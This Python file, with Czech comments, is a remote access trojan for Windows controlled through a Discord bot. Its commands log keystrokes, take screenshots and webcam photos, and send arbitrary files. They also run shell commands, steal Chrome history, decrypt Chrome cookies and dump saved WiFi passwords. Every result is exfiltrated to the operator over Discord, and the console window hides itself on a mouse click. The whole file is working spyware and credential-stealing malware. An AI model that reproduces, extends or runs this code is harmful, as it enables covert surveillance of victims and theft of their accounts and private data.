import discord
import pyautogui
import cv2
import numpy as np
import os
import asyncio
import subprocess
import sqlite3
import shutil
from discord.ext import commands
from PIL import ImageGrab
from pynput import keyboard, mouse
import win32crypt
import ctypes

# Nastavení prefixu pro příkazy bota
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# Keylogging setup
keylog = []
keylog_active = False

def on_press(key):
    global keylog
    try:
        keylog.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            keylog.append(' ')
        elif key == keyboard.Key.enter:
            keylog.append('\n')
        else:
            keylog.append(f'[{key.name}]')

@bot.command(name='keyscan_start')
async def keyscan_start(ctx):
    global keylog_active
    if not keylog_active:
        keylog_active = True
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        await ctx.send("Keylogging spuštěn.")
    else:
        await ctx.send("Keylogging už běží.")

@bot.command(name='keyscan_stop')
async def keyscan_stop(ctx):
    global keylog_active
    keylog_active = False
    await ctx.send("Keylogging zastaven.")

@bot.command(name='key_dump')
async def key_dump(ctx):
    global keylog
    if keylog:
        log = ''.join(keylog)
        await ctx.send(f"Keylogg:\n```\n{log}\n```")
        keylog = []
    else:
        await ctx.send("Keylogg je prázdný.")

# Příkaz pro screenshot obrazovky
@bot.command(name='screen_snap')
async def screen_snap(ctx):
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')
    await ctx.send("Screenshot zachycen. Posílám soubor.", file=discord.File('screenshot.png'))
    os.remove('screenshot.png')

# Příkaz pro snímek z webkamery
@bot.command(name='cam_snap')
async def cam_snap(ctx):
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        filename = 'camera_snap.jpg'
        cv2.imwrite(filename, frame)
        cap.release()
        await ctx.send("Snímek z kamery pořízen. Posílám soubor.", file=discord.File(filename))
        os.remove(filename)
    else:
        await ctx.send("Nepodařilo se připojit k webkameře.")

# Příkaz pro stažení souboru
@bot.command(name='download')
async def download(ctx, filename: str):
    if os.path.exists(filename):
        await ctx.send(f"Posílám soubor: {filename}", file=discord.File(filename))
    else:
        await ctx.send("Soubor nebyl nalezen.")

# Příkaz pro spuštění Windows příkazů
@bot.command(name='exec')
async def exec_command(ctx, *, command: str):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        await ctx.send(f'Výsledek příkazu:\n```\n{result}\n```')
    except subprocess.CalledProcessError as e:
        await ctx.send(f'Chyba při vykonávání příkazu:\n```\n{e.output}\n```')

# Příkaz pro čtení historie Chrome
@bot.command(name='grab_history')
async def grab_history(ctx):
    history_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\History'
    shutil.copy2(history_path, 'History')
    conn = sqlite3.connect('History')
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")
    history = cursor.fetchall()
    history_text = ""
    for url, title, last_visit_time in history:
        history_text += f'URL: {url}\nTitle: {title}\nLast Visit Time: {last_visit_time}\n\n'
    conn.close()
    os.remove('History')
    await ctx.send(f"Historie prohlížeče Chrome:\n```\n{history_text}\n```")

# Příkaz pro čtení cookies z Chrome
@bot.command(name='grab_cookies')
async def grab_cookies(ctx):
    cookies_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Cookies'
    shutil.copy2(cookies_path, 'Cookies')
    conn = sqlite3.connect('Cookies')
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    cookies = cursor.fetchall()
    cookies_text = ""
    for host_key, name, encrypted_value in cookies:
        decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
        cookies_text += f'Host: {host_key}\nName: {name}\nValue: {decrypted_value}\n\n'
    conn.close()
    os.remove('Cookies')
    await ctx.send(f"Cookies prohlížeče Chrome:\n```\n{cookies_text}\n```")

# Příkaz pro čtení WiFi hesel
@bot.command(name='grab_wifi')
async def grab_wifi(ctx):
    command = "netsh wlan show profiles"
    networks = subprocess.check_output(command, shell=True, universal_newlines=True)
    network_names = [line.split(":")[1].strip() for line in networks.split('\n') if "All User Profile" in line]
    
    wifi_details = ""
    for name in network_names:
        command = f"netsh wlan show profile name=\"{name}\" key=clear"
        result = subprocess.check_output(command, shell=True, universal_newlines=True)
        wifi_details += result + "\n"

    await ctx.send(f"WiFi detaily:\n```\n{wifi_details}\n```")

# Příkaz pro zastavení bota
@bot.command(name='stop')
async def stop_bot(ctx):
    await ctx.send("Bot se vypíná...")
    await bot.close()

# Funkce pro skrytí okna při kliknutí
def hide_window_on_click(x, y, button, pressed):
    if pressed:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)  # 0 - SW_HIDE

# Nastavení listeneru pro detekci kliknutí myši
mouse_listener = mouse.Listener(on_click=hide_window_on_click)
mouse_listener.start()

# Spuštění bota
@bot.event
async def on_ready():
    print(f'{bot.user} has connected to Discord!')

# Spusť Discord bota
bot.run('tvůj_discord_token')
